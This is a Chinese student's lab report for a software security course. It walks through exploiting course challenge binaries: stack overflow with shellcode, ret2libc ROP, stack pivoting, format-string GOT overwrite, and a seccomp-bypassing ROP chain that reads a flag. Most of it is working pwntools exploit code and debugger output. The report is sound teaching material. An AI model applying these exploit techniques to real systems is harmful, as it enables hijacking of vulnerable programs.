---
counter: True
comment: True
---

# 典型的内存破坏漏洞及其利用

!!! abstract
    软件安全 lab1 实验报告（2023.04.29 ~ 2023.06.03）

    !!! warning "仅供学习参考，请勿抄袭"

## 实验内容
- stack buffer overflow 实践（30分）：请通过覆盖返回地址，劫持控制流到 shellcode 实现拿 shell，完成本地测试和远程，最终执行远程的 flag.exe，报告中提供截图证明、并以附件形式提交攻击代码
- rop 实践1（20分），请完成对 rop2 程序的攻击，通过 ret2libc 劫持控制流到 system 实现拿 shell，完成本地测试和远程，最终执行远程的 flag.exe，提供截图证明，并以附件形式提交攻击代码
- rop 实践2（20分），请完成对 rop3 程序的攻击，通过迁栈后再进行 ret2libc 劫持控制流到 system 实现拿 shell，完成本地测试和远程，最终执行远程的 flag.exe，提供截图证明，并以附件形式提交攻击代码
- fsb 实践1 (10分)，请在 demo 基础上，学习 pwntools fmstr API 的使用，自动生成可以覆盖变量 var 的攻击 payload，将 var 覆盖为自己的学号，并本地测试，提修改成功的截图证明，并以附件形式提交攻击代码
- fsb 实践2（20分），请完成对 echo 程序的攻击，通过 fsb 实现对于 libc 地址的泄露、GOT 内容的覆盖，最终实现拿 shell，完成本地测试和远程，最终执行远程的 flag.exe，提供截图证明，并以附件形式提交攻击代码
- bonus（extra 20分）

## Stack Buffer Overflow

### sbof2
首先 checksec，发现没有任何保护，NX 关闭，存在 RWX 段（也可以通过 gdb vmmap 得知 stack 段是可执行的）：

<div style="text-align: center; margin-top: 15px;">
<img src="/assets/images/sec/software/lab1/checksec_sbof2.png" width="40%" style="margin: 0 auto;">
</div>

程序中输出了局部变量数组 buffer 的地址，gets 存在缓冲区溢出，所以可以向 buffer 中写入 shellcode，然后溢出覆盖返回地址到 buffer 的位置，实现 ret2shellcode。

objdump 可以得知 main 函数中开辟了 0x90 大小的栈空间，且 buffer 的位置在 rbp-0x80：
```text
0000000000401205 <main>:
  401205:	f3 0f 1e fa          	endbr64
  401209:	55                   	push   rbp
  40120a:	48 89 e5             	mov    rbp,rsp
  40120d:	48 81 ec 90 00 00 00 	sub    rsp,0x90
  ...
  401241:	48 8d 45 80          	lea    rax,[rbp-0x80]
  401245:	48 89 c7             	mov    rdi,rax
  401248:	b8 00 00 00 00       	mov    eax,0x0
  40124d:	e8 3e fe ff ff       	call   401090 <gets@plt>
```

所以要覆盖到返回地址，需要填充 0x80 + 8（saved rbp）个字节，后面接返回地址。所以 exp：

```python
p.recvuntil(b": ")
buffer_addr = p.recvline().decode().strip()
info(f"buffer_addr = {buffer_addr}")
buffer_addr = p64(eval(buffer_addr))

shellcode = asm(shellcraft.sh())
payload = b""
payload += shellcode
payload += b"A" * (0x80 + 8 - len(shellcode))
payload += buffer_addr

info(f"payload = {payload}")
p.sendline(payload)
p.interactive()
```

本地测试：

![](/assets/images/sec/software/lab1/sbof2_local.png)

远程攻击：

![](/assets/images/sec/software/lab1/sbof2_remote.png)

## ROP
### rop2
检查保护，开启了 NX，由于程序是静态链接，链接的库中包含了 canary，但实际上程序本身并没有开启 canary，可以正常栈溢出。

程序提供了后门，不过执行的是 /bin/ls，同时也提供了一个静态的 /bin/sh 字符串。由于程序是静态链接，而且没有开启 PIE，所以直接构造 ROP 链直接调用程序内的 system 即可。

首先需要 0x50 + 8（saved rbp）个字节填充到返回地址，然后返回地址上接一条 pop rdi; ret 的指令地址，接下来布局 gstr 字符串的地址使之 pop 到 rdi，然后放一个 system 的地址来实现调用。通过 ROPgadget 找到 pop rdi; ret 指令：

```text
❯ ROPgadget --binary rop2 | grep "pop rdi ; ret"
0x0000000000459a98 : mov eax, 0xe8c78948 ; pop rdi ; ret
0x0000000000459a97 : mov r8d, 0xe8c78948 ; pop rdi ; ret
0x0000000000400716 : pop rdi ; ret
0x00000000004a9f9d : pop rdi ; ret 0x22
```

所以使用 0x400716 位置处的 gadget 即可：

```python
gstr_addr = elf.symbols["gstr"]
system = elf.symbols["system"]
pop_rdi = 0x400716

payload = b"A" * 0x58
payload += p64(pop_rdi)
payload += p64(gstr_addr)
payload += p64(system)
payload = payload + b"B" * (128 - len(payload))
print(f"payload = {payload}")

p.recvuntil(b"[*] Please input the length of data:\n")
p.sendline(b"128")
p.recvuntil(b"[*] Please input the data:\n")
p.send(payload)

p.interactive()
```

但在运行的时候经过调试会在 system 函数中发生段错误，错误位置是一条 movaps 指令，想要访问 [rsp + 0x40]：

![](/assets/images/sec/software/lab1/rop2_segv.png)

经过搜索了解到 system 在执行的时候要求 rsp 16 字节对齐，否则会出现段错误。如上图此时 rsp 末尾为 8，为了让其变为 0 只需要多一次跳转即在 ROP 链中加一个直接跳转的指令地址就可以了：

```python
gstr_addr = elf.symbols["gstr"]
system = elf.symbols["system"]
pop_rdi = 0x400716
ret     = 0x400bf5

payload = b"A" * 0x58
payload += p64(pop_rdi)
payload += p64(gstr_addr)
payload += p64(ret)         # align rsp
payload += p64(system)
payload = payload + b"B" * (128 - len(payload))
```

远程：

![](/assets/images/sec/software/lab1/rop2_remote.png)

### rop3
这道题目限制了 buffer 的读入长度最多溢出 0x10，即一个 saved rbp 一个返回地址。但提供了外部的全局变量 gbuffer 也可以进行写入。所以要在 buffer 栈溢出的时候实现栈迁移，将 rbp rsp 转移到 gbuffer 中，然后在 gbuffer 中继续 ROP 链调用 system。

进行栈迁移需要 leave; ret 指令，首先目标函数会执行自己的 leave 指令来 mov rsp, rbp; pop rbp，这里 pop 的 rbp 就是栈上存的 saved rbp，是可以溢出覆盖的，可以将其覆盖为 gbuffer 地址。接下来在返回地址的位置放一条 leave; ret，这样就会继续再执行一条 leave，让 rsp 变成我们修改的位置，再 pop 会使其 +8，同时 rbp 相当于自身解引用了，后面不会用到，也就不用管它。

所以在 gbuffer 中，需要写入一个 /bin/sh 供后面使用，因为如前面的操作，rsp 会向后偏移 8 字节，这八字节也就是 gbuffer 开头直接放 /bin/sh\x00 即可。接下来 pop rdi; ret，然后放一个 gbuffer 地址，再放一个 system 地址即可。同时还要注意对齐 rsp：

```python
"""
❯ ROPgadget --binary rop3 | grep ": leave"
0x0000000000400700 : leave ; ret
❯ ROPgadget --binary rop3 | grep ": pop rdi ; ret"
0x0000000000400823 : pop rdi ; ret
❯ ROPgadget --binary rop3 | grep ": ret"
0x0000000000400586 : ret
"""
p.recvuntil("gift system address: ")
system = eval(p.recvline().decode().strip())
gbuffer = elf.symbols["gbuffer"]

leave_ret = 0x400700
pop_rdi   = 0x400823
ret       = 0x400586
payload = b"/bin/sh\x00"
payload += p64(pop_rdi)
payload += p64(gbuffer)
payload += p64(ret)
payload += p64(system)
print(f"payload = {payload}")
p.sendline(payload)

payload = b"A" * 0x40
payload += p64(gbuffer)
payload += p64(leave_ret)
print(f"payload = {payload}")
p.sendafter(b"> ", payload)

p.interactive()
```

![](/assets/images/sec/software/lab1/rop3_remote.png)

## FSB
### demo
这里要利用 pwntools 提供的 fmtstr 相关工具实现自动的任意地址写 payload 构造。首先使用 FmtStr 来爆破 offset，因为程序只有一次输入输出，所以每次测试要新建进程：

```python
def exec_fmt(payload):
    info(f"finding offset... payload = {payload}")
    p = process(elf_path)
    p.sendline(payload)
    res = p.recv()
    info(f"finding offset... res = {res}")
    p.close()
    return res

fsb = FmtStr(exec_fmt)
offset = fsb.offset
```

接下来使用 fmtstr_payload 构造 payload 即可，默认的 write_size 逐字节写入，导致 payload 太长无法全部输入，需要设置其为 short：

```python
var_addr = elf.symbols["var"]
payload = fmtstr_payload(offset, {var_addr: <数据删除>}, write_size="short")
info(f"payload = {payload}, len = {len(payload)}")

p = process(elf_path)
p.sendline(payload)
res = p.recvall()
success(res[res.find(b"var = "):].decode().strip())
```

![](/assets/images/sec/software/lab1/demo.png)

可以看出 FmtStr 得到了 offset 为 6，然后构造了 payload，之后程序中输出的 var 变量的值变成了 <数据删除\> 即学号 <数据删除\>。

### echo
题目进行了三次输入及 printf 输出，除此之外没有后门什么的，给了 libc.&zwnj;so，要实现 ret2libc 攻击。

只有三次输入输出机会，所以这三次的目标分别是：

1. 通过任意地址读读取 printf GOT 表中地址
    - 这里就是 printf 的实际加载地址
    - 由此可以根据 libc.&zwnj;so 中相对位置计算出 system 的加载地址
2. 通过任意地址写将 printf GOT 表中地址覆盖为 system 的地址
    - 这时下一次调用 printf 就会执行 system
3. 输入 /bin/sh，触发 system("/bin/sh")

第一步根据调试，padding 到 128 字节的情况下最后八个字节（存放 printf GOT 地址）的参数偏移为 23，所以 payload 就是 %23$sAAAAA...AAA<addr\>。接下来第二步使用 fmtstr_payload，第三步直接输入就可以了：

```python
offset = 8

def padding(s, length, remain):
    return s + (length - len(s) - remain) * b"A"

printf_got = elf.got["printf"]
payload = b"%23$s"
payload = padding(payload, 128, 8)
payload += p64(printf_got)
info(f"payload = {payload}")
p.send(payload)

recv = p.recv()
printf_addr = u64(recv[:6]+b"\x00\x00")
system_addr = printf_addr - (libc.symbols["printf"] - libc.symbols["system"])
info(f"printf_addr = {hex(printf_addr)}")
info(f"system_addr = {hex(system_addr)}")
payload = fmtstr_payload(offset, {printf_got: system_addr}, write_size="short")
info(f"payload = {payload}")

p.send(payload)
p.send(b"/bin/sh\0")
p.interactive()
```

![](/assets/images/sec/software/lab1/echo.png)

## Bonus
IDA 逆向可以看到 main 函数的开头进行了两次系统调用：

```c 
...
  syscall(157LL, 38LL, 1LL, 0LL, 0LL, 0LL);
  syscall(317LL, 1LL, 0LL, &v6);
  for ( i = 0LL; i <= 3; ++i )
  {
    memset(s, 0, 0x100uLL);
    printf("size> ");
    read(0, s, 0xFuLL);
    v4 = atoi(s);
    if ( v4 <= 256 )
    {
      memset(s, 0, 0x100uLL);
      read(0, s, (unsigned __int16)v4);
      puts(s);
    }
  }
  return 0LL;
}
```

第一次调用号 157 对应 prctl，第二次 317 对应 seccomp，所以这里是在设置 seccomp 过滤系统调用，通过 seccomp-tools 可以看到过滤规则（只保留了 open read write）：

```text
❯ seccomp-tools dump ./binary
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0003
 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0003: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
```

接下来进行四次输入输出，每次需要先输入长度 s，然后比较其和 256 的大小，如果再在 256 内则读取对应长度的内容然后 puts。但是这里长度也就是 v4 的变量类型是 __int16，所以如果长度为 0xffff 即 65535 则 atoi 的时候 v4 会变成 -1，绕过长度检测，然后读取的时候由于强转了 unsigned，所以可以读取 65535 个字节，实现栈溢出。

checksec 可以看出所有安全机制都是开启的，所以需要使用一次输入输出机会来泄露出 canary。然后需要一次输入输出来泄露出返回地址，这个地址就是 libc.&zwnj;so 里 \_\_libc\_start\_main 函数中 call main 的下一条地址，通过逆向 libc.&zwnj;so 可以得到这里的偏移为 0x29d90。所以可以计算出 libc 基地址，进而计算出 syscall 地址。

剩余两次输入输出，最后一次要构造 ROP 链进行 /flag.txt 的读取，根据前面限制的 syscall，就可以直接进行 open、read 到 buffer，write 到 stdout。所以需要提供一个位置来存放 "/flag.txt" 以及读取的内容。这里可以直接使用读入的 s 数组，所以倒数第二次就要泄露栈地址。

程序在运行时操作系统布局好 argc argv envp 等然后在栈上继续执行 _start 函数，其中再调用 libc 内的 \_\_libc\_start\_main，调用前栈的布局类似为（以下为使用本地 libc 静态链接的简单程序的调试结果）：

```text
00:0000│ rsp 0x7fffffffe3c0 —▸ 0x7fffffffe3c8 ◂— 0x0
01:0008│     0x7fffffffe3c8 ◂— 0x0
02:0010│     0x7fffffffe3d0 ◂— 0x1
03:0018│ rdx 0x7fffffffe3d8 —▸ 0x7fffffffe682 ◂— argv[0]
04:0020│     0x7fffffffe3e0 ◂— 0x0
05:0028│     0x7fffffffe3e8 —▸ 0x7fffffffe68d ◂— envp[0]
...
```

紧接着 \_\_libc\_start\_main 内会进行一些 push 然后构造它自己的帧栈，直到调用 main 之前，栈布局会变成类似：

```text
00:0000│ rbp rsp 0x7fffffffe2b0 —▸ 0x4018a0 (__libc_csu_init)
01:0008│         0x7fffffffe2b8 —▸ 0x401139 (__libc_start_main+777)
02:0010│         0x7fffffffe2c0 ◂— 0x0
03:0018│         0x7fffffffe2c8 ◂— 0x100000000
04:0020│         0x7fffffffe2d0 —▸ 0x7fffffffe3d8 —▸ 0x7fffffffe682 ◂— argv[0]
05:0028│         0x7fffffffe2d8 —▸ 0x400b6d (main)
06:0030│         0x7fffffffe2e0 ◂— 0x0
07:0038│         0x7fffffffe2e8 ◂— 0x5500000006
```

所以可以接着溢出使之输出栈上的 argv 地址，它对应的位置是在 \_\_libc\_start\_main 的帧栈之前的，也就是前面说到的系统布局 argv 的地址，中间的这些栈的变化都可以通过逆向 libc.&zwnj;so 得到，最终可以计算得出这个地址 - 0x228 即为 main 函数帧栈内 s 的地址。

接下来构造 ROP 链，因为给了 libc.&zwnj;so，所以在这里寻找 gadget 更方便，因为要进行的三次 syscall 分别为：

```c 
syscall(2, s, 0); // syscall(SYS_open, "/flag.txt", O_RDONLY)
syscall(0, fd, s+0x10, len); // syscall(SYS_read, fd, s+0x10, len) 这里的 fd 不确定，可以从 3 开始枚举
syscall(1, 1, s+0x10, len); // syscall(SYS_write, stdout, s+0x10, len)
```

所以需要布局四个参数（rdi rsi rdx rcx），寻找 gadget:

```text
❯ ROPgadget --binary libc.so | grep ": pop rdi ; ret"
0x000000000002a3e5 : pop rdi ; ret
❯ ROPgadget --binary libc.so | grep ": pop rsi ; ret"
0x000000000002be51 : pop rsi ; ret
❯ ROPgadget --binary libc.so | grep ": pop rdx ; ret"
0x000000000003bad3 : pop rdx ; retf 0x19
❯ ROPgadget --binary libc.so | egrep ": pop rdx ; .*? ; ret"
...
0x0000000000090529 : pop rdx ; pop rbx ; ret
❯ ROPgadget --binary libc.so | grep ": pop rcx ; ret"
0x000000000008c6bb : pop rcx ; ret
```

之后根据这些目标编写 exp 即可：

1. 泄露 canary
    ```python
    p.sendafter(b"size> ", b"65535".ljust(0xf, b"\x00"))
    p.send(b"A" * 0x109)
    p.recvn(0x109)
    canary = u64(b"\x00" + p.recvn(7))
    info(f"canary: {hex(canary)}")
    ```
2. 泄露 libc 基地址
    ```python
    p.sendafter(b"size> ", b"65535".ljust(0xf, b"\x00"))
    p.send(b"A" * 0x108 + b"A" * 8 + b"A" * 8)
    p.recvn(0x118)
    ret_addr = u64(p.recvn(6) + b"\x00\x00")
    libc_base = ret_addr - 0x29d90
    syscall_addr = libc_base + libc.symbols["syscall"]
    info(f"ret_addr: {hex(ret_addr)}")
    info(f"libc_base: {hex(libc_base)}")
    info(f"syscall_addr: {hex(syscall_addr)}")
    ```
3. 泄露栈上 s 地址
    ```python
    p.sendafter(b"size> ", b"65535".ljust(0xf, b"\x00"))
    p.send(b"A" * 0x108 + b"A" * (8 + 8 + 8 + 8 + 8 + 8))
    p.recvn(0x138)
    stack_addr = u64(p.recvn(6) + b"\x00\x00")
    buffer_addr = stack_addr - 0x228
    info(f"stack_addr: {hex(stack_addr)}")
    info(f"buffer_addr: {hex(buffer_addr)}")
    ```
4. 构造 ROP payload
    - 写入 "/flag.txt" 并溢出、填入 canary，覆盖 rbp
        ```python
        payload = b"/flag.txt\x00\x00\x00\x00\x00\x00\x00"
        payload += b"A" * (0x108 - len(payload))
        payload += p64(canary)
        payload += b"A" * 8
        ```
    - syscall open
        ```python
        pop_rdi_ret     = libc_base + 0x2a3e5
        pop_rsi_ret     = libc_base + 0x2be51
        pop_rdx_rbx_ret = libc_base + 0x90529
        pop_rcx_ret     = libc_base + 0x8c6bb
        
        payload += p64(pop_rdi_ret)
        payload += p64(2) # open
        payload += p64(pop_rsi_ret)
        payload += p64(buffer_addr)
        payload += p64(pop_rdx_rbx_ret)
        payload += p64(0) # O_RDONLY
        payload += p64(0)
        payload += p64(syscall_addr)
        ```
    - syscall read
        ```python
        payload += p64(pop_rdi_ret)
        payload += p64(0) # read
        payload += p64(pop_rsi_ret)
        payload += p64(4) # fd
        payload += p64(pop_rdx_rbx_ret)
        payload += p64(buffer_addr + 0x10)
        payload += p64(0)
        payload += p64(pop_rcx_ret)
        payload += p64(0x40)
        payload += p64(syscall_addr)
        ```
    - syscall write
        ```python
        payload += p64(pop_rdi_ret)
        payload += p64(1) # write
        payload += p64(pop_rsi_ret)
        payload += p64(1) # fd
        payload += p64(pop_rdx_rbx_ret)
        payload += p64(buffer_addr + 0x10)
        payload += p64(0)
        payload += p64(pop_rcx_ret)
        payload += p64(64)
        payload += p64(syscall_addr)
        
        p.sendafter(b"size> ", b"65535".ljust(0xf, b"\x00"))
        p.send(payload)
        p.interactive()
        ```

远程：

![](/assets/images/sec/software/lab1/bonus.png)
